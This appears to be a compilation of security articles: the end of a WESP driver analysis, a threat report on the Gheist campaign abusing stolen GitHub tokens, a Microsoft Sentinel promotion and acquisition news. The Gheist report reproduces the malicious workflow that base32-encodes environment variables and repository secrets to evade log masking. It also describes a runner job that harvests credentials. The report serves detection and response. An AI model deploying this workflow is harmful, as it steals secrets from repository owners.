How is the driver communicating with user mode if it has no device objects, taking DeviceIoControl off the table? File system mini-filters have a mechanism available to them, which is using FilterCommunicationPort kernel objects. These provide bidirectional communication with user mode clients, which is more flexible than DeviceIoControl-style communication, which is unidirectional in nature (user to kernel). We can also see this in the imports called from FltMgr.sys, like FltCreateCommunicationPort, the fundamental API for creating such an object. You can also see a port named ESPFilterPort under the root object manager directory (shown in WinObj from Sysinternals):

Can a user-mode client block process creation?

What about the user mode client? We can open espclient.dll (located in the System32 directory) in Total PE to get some hints:

As you can see, the DLL exports lots of functions, all starting with Esp. We can identify rules and filters, confirming the assumption that these are necessary, so events can be filtered at the source, i.e., not sent to user mode if there is no interest. The API is C-based (not COM) – at least as it’s exposed to consumers. The client DLL’s imports include FltLib.Dll, which is the client DLL for using filter communication port objects. The three functions being used by EspClient.Dll are FilterConnectCommunicationPort (open a handle to a FilterCommunicationPort object), FilterGetMessage, and FilterSendMessage. A missing function (in my mind) is FilterReplyMessage, which allows a direct reply to a message from the driver. This missing function implies that user mode has no “response” capability, and that communication is one-way. This means that running custom code in user mode and then “replying” to the driver with a “decision” (such as blocking a process from being created) is probably not implemented, at least not yet.

Conclusion: What WESP means for EDR vendors

WESP is Microsoft’s attempt to reduce third-party kernel code that Microsoft can't fully control. It aims to increase Windows reliability by reducing the chances of BSODs or other nastiness that could result from kernel driver code. The hope is that, by leveraging WESP, we can reduce the need for third-party kernel code and potentially remove it entirely. WESP isn't broadly available or well documented yet, but EDR providers are preparing to use it. Elastic is among them: Elastic Defend, Elastic’s XDR solution, is preparing to support WESP.

Title: Gheist: Attempted Scaled Abuse of Stolen GitHub Tokens Stumbles
Context: As of October 24: the attack is ongoing and evolving roughly ⅔ of implicated accounts are no longer available on GitHub
Full Text:
Since September 15, 2026, Wiz Research has been tracking Gheist: a new campaign performing mass abuse of compromised GitHub tokens. The attack commits a workflow named sync-check to every repository to which each token has access. The workflow seeks to print the repository's secrets into its own workflow log. Then, the tool downloads the log through the GitHub API and deletes the run seconds later. The tool's API requests carry the user agent gheist, which gives the campaign its name.

We have recovered more than 13,500 planted branches from more than 850 compromised accounts, ranging from personal projects to enterprise organizations' private repositories.

A recent GitHub control has been blocking the exploitation in public repositories, but we've observed successful exploitation and follow-on activity in private repositories and GitHub enterprise environments.

As of October 24:

the attack is ongoing and evolving

roughly ⅔ of implicated accounts are no longer available on GitHub. This likely indicates response activity, as we have reported this activity to GitHub.

How the attack works

For each repository, the tool creates a branch named ci-sync- plus six random characters, then commits .github/workflows/sync-check.yml with the message ci: sync config. The commit is unsigned and authored as the token's owner. The push event triggers the workflow:

name: sync-check on: [push] permissions: {} jobs: sync: runs-on: ubuntu-latest timeout-minutes: 6 steps: - name: build run: | env | base32 -w 120 echo -n '${{ toJSON(secrets) }}' | base32 -w 120

Three details make it work:

GitHub masks secret values in logs only when they appear verbatim. A base32-encoded secret doesn't match, so it prints in full.

While permissions: {} restricts the job's GITHUB_TOKEN, which the attacker doesn't need, it doesn't restrict the secrets context.

When a repository has deployment environments, the tool lists them in a job matrix with environment: ${{ matrix.environment }}, so environment-scoped secrets, often production credentials, are printed too.

Because the secrets leave through GitHub's own API, there is no attacker domain or outbound connection to block.

In enterprise organizations, we saw the tool cycle through tokens of several users and automation accounts within minutes, clone private repositories before planting the workflow, and hours later, cloud credentials from the same organization used to enumerate AWS Secrets Manager.

How the payload evolved

Two variants of this attack have been observed in parallel. They can be distinguished via the branch names.

Tool A uses a hexadecimal suffix and the plain payload.

Tool B uses a base36 suffix, added timeout-minutes: 6 and the environment matrix within hours of its first run on September 28, and modifies the selected payload per repository.

On October 19, Tool B added echo X | base32 -w 120 between the dumps, which prints LAFA==== as a separator, likely for the operator's log parser. Hours later it pushed a second job, sync-host, with runs-on: self-hosted, apparently only to repositories with a registered self-hosted runner. It writes three helper files (.gdmp_pat, .gdmp_patg, .gdmp_sweep) and logs each stage under a ===== gdmp-pivot: <stage> ===== header:

Host details and crontab.

A recursive search of the home directory, workspace and system paths for 31 token formats (including keys for AI providers such as Anthropic, Hugging Face, Groq and NVIDIA), private keys, .env files, Terraform state and shell history.

The environment of every process, from /proc/*/environ.

Through the Docker socket, a container with the host's root filesystem mounted, to repeat the search on the host.

AWS instance-role credentials, plus GCP and Azure metadata.

GitHub Actions and GitLab runner credential files.

The Kubernetes service account token.

However, this job is buggy: it looks for the wrong runner key file, its URL-credential regex is broken, and it doesn't collect GCP or Azure tokens.

GitHub's approval hold and private repositories

Since July 28, 2026, GitHub has held potentially malicious workflow runs in public repositories until a collaborator approves them. Every public Gheist run we checked, across all variants including the self-hosted job, sits at action_required. The control worked, and the malicious payloads never ran.

Unfortunately, that hold doesn't apply to private repositories or GitHub Enterprise Server. There, GitHub audit logs show runs on ci-sync-* branches completing and then being deleted by the gheist user agent. CloudTrail shows the organizations' own workflows running on those branches and assuming AWS roles, which proves Actions executed without approval.

For defenders, that last signal finds Gheist without any GitHub logs, as shown below.

Other activity on the same accounts

This campaign is leveraging compromised GitHub access. The same accounts are used by other actors and campaigns, which demonstrates how compromised credentials can move throughout the threat actor ecosystem. We've observed overlaps with the following campaigns:

Lure repositories (malware distribution). On October 6, 391 accounts renamed about 1,461 repositories to cracked-software lures like fl-studio-crack and solana-sniper-lite. The rename wiped 610 ci-sync branches as a side effect. 166 of these accounts never appear in Gheist activity, so the pool is larger than Gheist's footprint.

Free compute. On October 18, 25 Gheist accounts each created a "Windows RDP Runner" repository within nine minutes, attempting to abuse GitHub Actions for free compute cycles.

PolinRider. Some victims appear to be infected with PolinRider, the DPRK-linked malware that hides JavaScript in build config files and force-pushes back-dated commits. On October 19 and 20, three victims re-pushed their Gheist commits with a loader appended to vite.config.js behind hundreds of whitespace characters, and in two cases an api.js that package.json runs before every dev and build.

Megalodon. 57 accounts from Gheist's first phase were also victims of Megalodon in May.

The credential sources we could trace fit this picture: infostealer logs, and tokens exposed in earlier supply-chain compromises such as the Trivy compromise in March.

Note: Gheist is distinct from GhostAction, which uses different workflow files and exfiltrates secrets to 193.32.204[.]199.

Which actions should security teams take?

Hunt

Look for branches named ci-sync- followed by six random characters, where the only change is a new file at .github/workflows/sync-check.yml with the commit message ci: sync config.

In GitHub audit logs, look for workflow runs on ci-sync-* branches that were deleted within a minute of completing, and for any activity from the user agent gheist.

If your workflows authenticate to the cloud with OIDC, check cloud audit logs for role assumptions or token exchanges whose subject includes a ci-sync- branch. That shows GitHub Actions ran on an attacker branch, even if you don't collect GitHub logs.

On self-hosted runners, look for the files .gdmp_pat, .gdmp_patg and .gdmp_sweep, and the string gdmp-pivot in job logs.

Respond

Rotate every repository, organization and environment secret available to an affected repository. Deleting the run or the branch doesn't undo the exposure.

Revoke the tokens that pushed the commits, and check their owners' devices for infostealers.

If a ci-sync branch ran on a self-hosted runner, treat the host and its instance role as compromised.

Don't approve held sync-check runs, and don't run code from ci-sync branches.

Harden. Require reviewers on environments with production secrets, scope OIDC trust policies to protected branches or environments, use GitHub Apps or short-lived fine-grained tokens instead of personal access tokens, and run self-hosted runners as ephemeral hosts without Docker socket or unrestricted metadata access.

Indicators of compromise

User agent gheist

Branch ci-sync- followed by six characters, matching ^ci-sync-[0-9a-z]{6}$

Commit message ci: sync config adding only .github/workflows/sync-check.yml

Markers toJSON(secrets) }}' | base32 -w 120 and ===== gdmp-pivot:; files .gdmp_pat, .gdmp_patg, .gdmp_sweep

Workflow blob SHAs: f3da2b8b357dcda02fd455d314be2a95007516a6 (plain), d09535857a741bbb976bdc084a9a021713133291 (timeout), 1dc5af9cce950aad1eb1546ecce8565b117540c4 (separator), c665b778b2d822453293003e7ca0bbb2cb08e39d (self-hosted job). Environment-matrix variants differ per repository.

How can Wiz help?

The Threat Center advisory includes an Event Explorer query covering planted commits, Gheist activity in GitHub audit logs and cloud role assumptions from attacker branches. Wiz Defend detects the activity with rules including "New Workflow Completed And Deleted In Short Time Span", "Workflow Pushed With Secret Dump" and "Commit Created With Known Malicious Commit Message".

We’re honored that Microsoft has once again been recognized as a Leader in the 2026 Gartner® Magic Quadrant™ for Security Information and Event Management (SIEM).

As security environments grow more complex and attackers move faster, organizations need more than the ability to collect and analyze data. They need comprehensive visibility, context to understand what is happening, and the ability to act before an attack causes further damage.

Explore Microsoft Sentinel SIEM capabilities

Comprehensive SIEM across the digital estate

Microsoft Sentinel is our cloud-native SIEM, bringing together security data, advanced analytics, automation, and threat intelligence to help organizations protect their digital estate.

With more than 500 connectors across Microsoft and third-party solutions, Microsoft Sentinel brings together signals from across complex, multicloud environments. Its rich library of out-of-the-box detections, informed by Microsoft’s threat intelligence and organizational context, helps defenders identify sophisticated threats without building every detection from scratch.

Microsoft Sentinel supports the core capabilities security teams depend on, from scalable security data management and advanced detection to threat hunting, investigation, and response. The Microsoft Sentinel data lake centralizes historical and real-time security data across platforms and clouds for cost-effective retention and advanced analytics at scale. Security operations center (SOC) optimization and cost management help teams improve coverage, identify detection gaps, and make informed decisions about the data they collect and retain.

Reimagining security operations for the agentic era

On September 23, 2026, Microsoft introduced the Integrated Security Operations Center (ISOC) in Microsoft Defender, reimagining security operations for the agentic era. As threats grow more sophisticated and security environments more complex, traditional approaches built on disconnected tools and workflows can no longer keep pace. ISOC brings security operations and threat protection together, creating a unified foundation where people and AI agents can see, understand, and act across the environment.

Through deep integration with Microsoft Sentinel, ISOC combines the full breadth of SIEM capabilities with extended detection and response (XDR), threat intelligence, posture management, and response. By connecting signals from Microsoft and third-party environments with rich security context and coordinated action, ISOC enables security teams to move beyond fragmented investigations toward faster, more proactive protection. Rather than operating as separate tools, the security stack works as one system, providing the foundation for agentic security.

Attack disruption demonstrates what this integrated approach makes possible. Microsoft Defender correlates signals across Microsoft and third-party environments with threat intelligence to identify high-confidence attacks in progress and automatically contain compromised users and devices before threats spread. This includes ransomware, business email compromise, and adversary-in-the-middle attacks. Across customers, ransomware attacks are disrupted in just 30 seconds on average.

Together, these capabilities demonstrate how Microsoft is moving security operations beyond detection and response toward an integrated, agentic approach that helps organizations anticipate, investigate, and stop threats faster.

A shared foundation for people and agents

AI is becoming part of how security teams work every day. Microsoft Sentinel combines advanced analytics, machine learning, and automation to help analysts use natural language to hunt for threats, generate response playbooks, support alert triage, analyze complex signals, and accelerate investigations. These capabilities reduce manual work and give defenders more time to focus on the threats and decisions that matter most.

By enabling SIEM and native protection to operate as one system, ISOC gives people and AI agents a shared foundation to see, understand, and act across the environment. Agents bring speed and scale to continuous security operations, while people provide expertise, judgment, and accountability.

Together, they can move beyond traditional, linear workflows toward continuous detection, investigation, and attack disruption. As agents take on more security operations workflows, comprehensive data, and rich context, the ability to act becomes even more important to helping organizations stop threats faster and deliver better security outcomes.

Looking ahead

The future of SIEM is about more than managing security data. It’s about ensuring your SIEM is a core building block of the agentic SOC, bringing together security data, intelligence, AI, and native protection so people and agents can understand threats sooner, act faster, and stop attacks before they spread.

We’ll continue investing in the comprehensive SIEM capabilities customers rely on while advancing integrated, agentic security operations in Microsoft Defender. We’re grateful for the Gartner recognition and for the customers, partners, and security community whose feedback continues to shape Microsoft Sentinel.

Learn about the Integrated Security Operations Center in Microsoft Defender.

Title: Palo Alto Networks bets $4.5B on enterprise AI with Applied Compute acquisition
Context: Applied Compute co-founder and CEO Yash Patil will become Palo Alto’s co-chief AI officer, and the startup’s research team will help build AI models across the company’s offerings
Full Text:
Palo Alto Networks has agreed to buy Applied Compute in an all-stock deal valued at $4.5 billion, a move the company said will let it train, deploy and secure open-weight AI models for enterprises in the public cloud or in their own sovereign environments.

“The acquisition will bring Applied Compute’s platform and world-class AI research team to Palo Alto Networks to help enterprises adopt AI securely, whether they choose open-weight models, closed frontier models, or both,” the company said in a statement released alongside its fiscal first quarter 2027 results. The statement described Applied Compute as “a leading platform for post-training and inference of open-weight AI models” and said the startup will continue to serve AI-native companies, digital natives and large enterprises.

The transaction is expected to close in Palo Alto’s fiscal third quarter of 2027, which runs from February to April, the statement said. Applied Compute co-founder and CEO Yash Patil will become Palo Alto’s co-chief AI officer, and the startup’s research team will help build AI models across the company’s offerings.

A security company that wants to run models

Nikesh Arora, Palo Alto’s chairman and CEO, said on the company’s earnings call that beyond building AI into its own security products, “we will help train and serve secure sovereign implementations of open-weight models to the enterprise.”

“Open-weight model implementations will allow us to deliver secure, open-weight models to our customers to enable adoption of secure AI in the enterprise,” Arora said. He said open-weight models had grown from under 5% of token traffic to more than 60% over the past year, without saying where the figure came from.

Asked by JP Morgan analyst Brian Essex about customer demand, Arora said deterministic security controls “cannot anticipate every scenario that an agent is going to conduct.” Enterprises building AI applications “will have to train a supervisory AI model at the same time,” he said, because Palo Alto cannot secure models it has no part in building.

“I cannot go in and intercept and understand somebody else’s application,” he said.

Sanchit Vir Gogia, chief analyst at Greyhound Research, said Arora has a point, since a generic filter cannot know how a particular application is meant to behave. But most failures in AI applications happen at runtime, through prompts, tools, and permissions, whoever trained the model, he said. He noted that Palo Alto has sold model-agnostic protection through Prisma AIRS since 2025.

“A supervisor trained by the same hands as the system it supervises is a colleague, not a check,” Gogia said, adding that CIOs should make sure someone other than the trainer tests the result.

GPUs and data centers

To train and host those models, Palo Alto plans to build its own compute capacity, CFO Dipak Golechha said on the call. The spending “will mostly go to GPUs and servers,” with a smaller share for the facilities that house them, he said. Palo Alto will “continue to source from our cloud partners” and add dedicated capacity over time, Golechha said. Arora said the company aims for more than100 megawatts of compute in the next three to five years.

Gogia said Palo Alto has sovereignty credentials for security data, including customer-held keys and a European Cortex service governed by Deutsche Telekom. “None of that yet extends to GPUs,” he said, adding that a US-headquartered operator faces the same jurisdictional questions as the hyperscalers it rents capacity from.

“A sovereign hosting offer with no named region, operator or date is a promise looking for an address,” Gogia said. Compliance officers should ask Palo Alto for a region list, the operator, and a dated certification plan, he said.

Arora said on the call that the training and inference business could eventually exceed Palo Alto’s core market. “This could be bigger than what we do today,” he said.

One vendor, more of the stack

The deal follows Palo Alto’s $25 billion purchase of CyberArk, which added identity security to its platform. Gogia said Applied Compute would now add the models themselves to a supplier already at the center of many customers’ firewalls, SOC, and identity controls.

“Palo Alto is asking enterprises to let the guard build the vault it guards,” he said. One team watching both model and telemetry can spot trouble sooner, he said, but a single fault, breach or pricing dispute would land “on the protection and the protected together.”

CIOs should get a costed exit in writing before any model work moves across, Gogia said. Applied Compute customers should use the months before closing to secure ownership of trained weights in an exportable format, no training on their data without consent, a right to exit on change of control and price protection that survives bundling, he said. “Terms are cheapest to win while the suitor is still courting,” Gogia said.
